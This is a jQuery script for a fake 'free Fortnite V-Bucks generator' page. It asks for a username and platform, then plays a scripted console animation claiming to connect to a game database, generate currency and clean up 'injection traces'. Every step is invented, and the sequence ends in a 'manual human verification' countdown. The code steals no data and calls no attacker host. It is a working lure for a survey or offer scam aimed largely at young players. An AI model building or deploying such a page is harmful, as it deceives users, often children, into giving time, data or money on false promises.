$(document).ready(function() {

    // vBucks Amounts
	$vbucks_amount_1 = '2500';
	$vbucks_amount_2 = '5000';
	$vbucks_amount_3 = '7500';
	$vbucks_amount_4 = '13500';
	$selected_amount = '';

	// Console Messages
	var $console_message_resource_1 = 'v-Bucks';
	var $console_message_1 = 'Loading generator files...';
	var $console_message_2 = 'Extracting generator files...';
	var $console_message_3 = 'Connecting to proxy server...';
	var $console_message_4 = 'Establishing connection with game database...';
	var $console_message_5 = 'Searching for username';
	var $console_message_6 = 'Succesfully connected to username';
	var $console_message_7 = 'Preparing to generate Fortnite v-Bucks';
	var $console_message_8 = 'Generating';
	var $console_message_9 = 'Succesfully generated';
	var $console_message_10 = 'Cleaning up injection traces';
	var $console_message_11 = 'Performing automatic human verification';
	var $console_message_12 = 'Automatic human verification failed';
	var $console_message_13 = 'Manual verification required';

	// Human Verification Timer
	var $human_verification_timer_value = '180'; //Countdown remaing time in seconds

	$('#ftn-platform').on('change', function() {
		if(this.value == 'pc' ) {
			$(".platform-icon-wrapper").html('<i class="fab fa-windows input-icon"></i>');
		} else if (this.value == 'psn' ) {
			$(".platform-icon-wrapper").html('<i class="fab fa-playstation input-icon"></i>');
		} else if (this.value == 'xbl' ) {
			$(".platform-icon-wrapper").html('<i class="fab fa-xbox input-icon"></i>');
		} else if (this.value == 'ios' ) {
			$(".platform-icon-wrapper").html('<i class="fab fa-apple input-icon"></i>');
		}
	});

	function formNotValid(){
		$(".username-group").addClass('shake animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
			$(this).removeClass('shake animated');
		});
	}
	$("#fortnite-player-form").validator().on("submit", function (event) {
		$('.error-label').remove();
		if (event.isDefaultPrevented()) {
			$('#username-error').append('<label class="error-label red">Enter Username</label>');
				setTimeout(function(){
						$('.error-label').fadeOut();
							setTimeout(function(){
								$('.error-label').remove();
							},300);
					}, 3000);
				formNotValid();
				
			
		} else {
			event.preventDefault();
				if($('#ftn-username').val().length < 5){
					formNotValid();
					$('.input-style.d3w8943').css("color","red");
					$('#username-error').append('<label class="error-label red">Invalid Username</label>');
					
					setTimeout(function(){
						$('.error-label').fadeOut();
							setTimeout(function(){
								$('.error-label').remove();
							},300);
					}, 3000);
				}
				else{
					$('.generatebtn').remove(); $('.btn-Fortnite').append('<span> ► Continue</span>');
					$('.input-style.d3w8943').css("color","green");
					$('#username-error').append('<label class="error-label green">Username: OK</label>');
					process();
				}
		}
	});
	
	function process(){
		
		$profile_username = $( "#ftn-username" ).val();
		$vbucks_position = 1;
	
		$('#popup-wrapper-content').magnificPopup({
			delegate: 'a',
			type: 'inline',
			preloader: false
		});
		
		$('.slick-next').click(function(){
			if($vbucks_position >= 4){
				return $vbucks_position;
			}
			else{
				$vbucks_position += 1;
			}
		});
		
		$('.slick-prev').click(function(){
			if($vbucks_position <= 1){
				return $vbucks_position;
			}
			else{
				$vbucks_position -= 1;
			}
			
		});
		
		$('.btn-Fortnite').click(function(){
			
			$('.changable').hide().fadeOut();
				
				$('.popup-wrapper-content').css("background","url('popup-bg.jpg')");
					
				$('.resource-select-wrapper').fadeIn();
					$('.resources-slider').slick({
						dots: false,
						speed: 300,
						slidesToShow: 1,
						infinite: false,
					});
		});
		
	
		$('.btn-Generate').click(function(){
			
			$('.resource-select-wrapper').hide().fadeOut();
			$('.console-wrapper').fadeIn();
			
			$selected_amount = $vbucks_amount_1;
			$selected_amount_img = "v-bucks-img-1.png";
				
				
			if($vbucks_position == 1){
				$selected_amount_img = "v-bucks-img-1.png";
				$selected_amount = $vbucks_amount_1;
			}
			if($vbucks_position == 2){
				$selected_amount_img = "v-bucks-img-2.png";
				$selected_amount = $vbucks_amount_2;
			}
			if($vbucks_position == 3){
				$selected_amount_img = "v-bucks-img-3.png";
				$selected_amount = $vbucks_amount_3;
			}
			if($vbucks_position == 4){
				$selected_amount_img = "v-bucks-img-4.png";
				$selected_amount = $vbucks_amount_4;
			}
			
			if($('#ftn-platform').val() == "pc"){
				$selected_platform = "Windows PC";
			}
			if($('#ftn-platform').val() == "psn"){
				$selected_platform = "Playstation 4";
			}
			if($('#ftn-platform').val() == "xbl"){
				$selected_platform = "Xbox One";
			}
			if($('#ftn-platform').val() == "ios"){
				$selected_platform = "iOS";
			}
			
			$console_username = $profile_username;
			
			$("#console-selected-amount-img").attr("src",$selected_amount_img);
			
			function progressBarConsole(percent, $element) {
				
				var progressBarConsoleWidth = percent * $element.width() / 100;
				$element.find('div').animate({ width: progressBarConsoleWidth }, 500).html(percent + "%&nbsp;");
				
			}
			
			progressBarConsole(0, $('#progressBarConsole'));
			
				$('.console-username-wrapper').hide();
				$console_message = $('.console-message');
				$console_message.html($console_message_1);
				setTimeout(function() {
					$('.console-progress-bar-wrapper').fadeIn();
					$console_message.html($console_message_2);
					progressBarConsole(3, $('#progressBarConsole'));
				}, 1000 );
				setTimeout(function() {
					$console_message.html($console_message_3);
					progressBarConsole(7, $('#progressBarConsole'));
				}, 2000 );
				setTimeout(function() {
					$console_message.html($console_message_4);
					progressBarConsole(10, $('#progressBarConsole'));
				}, 3200 );
				setTimeout(function() {
					
					$console_message.html($console_message_5 + ' ' + $console_username);
					$('.console-username-wrapper').fadeIn();
					progressBarConsole(14, $('#progressBarConsole'));
				}, 4800 );
				setTimeout(function() {
					$(".console-loader-wrapper").fadeOut(function(){
						$(".console-username-wrapper").fadeIn(function(){
							$('#console-username-val').html($console_username);
							$('#console-platform-val').html($selected_platform);
							$($console_message).addClass('animated infinite pulse');
						});
					});
					progressBarConsole(17, $('#progressBarConsole'));
				}, 4800 );
				setTimeout(function() {
					if ($sound_setting == 1) {
						ion.sound.play("success");
					}
					$console_message.html("<span class='c-message-success'>" + $console_message_6 + ' ' + $console_username + "</span>");
					$($console_message).removeClass('animated infinite jello');
					$('.console-username-wrapper').removeClass('animated infinite jello');
					$('.console-username-wrapper').addClass('animated bounce');
					$('.console-username-wrapper').addClass('connected');

					progressBarConsole(25, $('#progressBarConsole'));
				}, 8500 );
				setTimeout(function() {
					$(".console-username-wrapper").fadeOut(function(){
						$('.console-loader-wrapper').fadeIn();
						$console_message.html($console_message_7);
					});
					progressBarConsole(28, $('#progressBarConsole'));
				}, 9500 );
				setTimeout(function() {
					var $vbucks_count_to = $selected_amount;
					$console_message.html("<span class='c-r-value-label'>" + $console_message_8 + "&nbsp;<span class='c-r-value-r-1-accent'>" + $selected_amount + "</span>&nbsp;" + $console_message_resource_1) + "</span>";
					$(".console-loader-wrapper").fadeOut(function(){
						$('.console-message-wrapper').animate({"bottom":"25px"}, "fast");
						$('.console-count-to-wrapper').fadeIn(function(){
							$('#console-amount').countTo({
								from: 0,
								to: $selected_amount,
								speed: 2000,
								refreshInterval: 5,
								formatter: function (value, options) {
								return value.toFixed(options.decimals);
								}
							});
						});
					});
					progressBarConsole(32, $('#progressBarConsole'));
				}, 12500 );
				setTimeout(function() {
					if ($sound_setting == 1) {
						ion.sound.play("success");
					}
					$('.console-count-to-wrapper').addClass('connected animated bounce');
					$console_message.html("<span class='c-message-success'>" + $console_message_9 + "&nbsp;<span class='c-r-value-r-1-accent'>" + $selected_amount + "</span>&nbsp;" + $console_message_resource_1) + "</span>";

					progressBarConsole(55, $('#progressBarConsole'));
				}, 16000 );
				setTimeout(function() {
					$(".console-count-to-wrapper").fadeOut(function(){
						$('.console-message-wrapper').animate({"bottom":"60px"}, "fast");
						$('.console-loader-wrapper').fadeIn();
						$console_message.html($console_message_10);
						progressBarConsole(87, $('#progressBarConsole'));
					});
				}, 18100 );
				setTimeout(function() {
					$console_message.html($console_message_11);
					progressBarConsole(90, $('#progressBarConsole'));
				}, 19800 );
				setTimeout(function() {
					$console_message.html("<span class='c-message-error'>" + $console_message_12 + "</span>");
					progressBarConsole(92, $('#progressBarConsole'));
				}, 21200 );
				setTimeout(function() {
					$console_message.html($console_message_13);
					progressBarConsole(95, $('#progressBarConsole'));
				}, 22800 );
				setTimeout(function() {
					$('.console-wrapper').fadeOut(function(){
						$(".human-verification-wrapper").fadeIn(function(){
							human_verification_timer.init($human_verification_timer_value);
						});
					});
				}, 24500 );
			
		});
		
	}
	
	
	$('.popup-tos').magnificPopup({
        type: 'inline',
        preloader: false
    });
    $('.popup-contact').magnificPopup({
        type: 'inline',
        preloader: false
    });
    $('.popup-pp').magnificPopup({
        type: 'inline',
        preloader: false
    });
	




	function rng(min, max) {
		return Math.floor(Math.random() * (max - min + 1) + min);

	}


	function Random(_0xaa63x2, _0xaa63x3) {
		return Math['floor'](Math['random']() * (_0xaa63x3 - _0xaa63x2) + _0xaa63x2);
	};

});

var human_verification_timer = function () {
    var time_left = 15;
    var keep_counting = 1;
    var time_out_msg = 'few seconds';
    function countdown() {
        if(time_left < 2) {
            keep_counting = 0;
        }
        time_left = time_left - 1;
    }
    function add_leading_zero( n ) {
        if(n.toString().length < 2) {
            return '0' + n;
        } else {
            return n;
        }
    }
    function format_output() {
        var hours, minutes, seconds;
        seconds = time_left % 60;
        minutes = Math.floor(time_left / 60) % 60;
        hours = Math.floor(time_left / 3600);
        seconds = add_leading_zero( seconds );
        minutes = add_leading_zero( minutes );
        hours = add_leading_zero( hours );
        return minutes + ' minutes and ' + seconds + ' seconds';
    }
    function timer_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = '<span>' + format_output() + '</span>';
    }
    function no_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = time_out_msg;
    }
    return {
        count: function () {
            countdown();
            timer_time_left();
        },
        timer: function () {
            human_verification_timer.count();
            if(keep_counting) {
                setTimeout("human_verification_timer.timer();", 1000);
            } else {
                no_time_left();
            }
        },
        init: function (n) {
            time_left = n;
            human_verification_timer.timer();
        }
    };
}();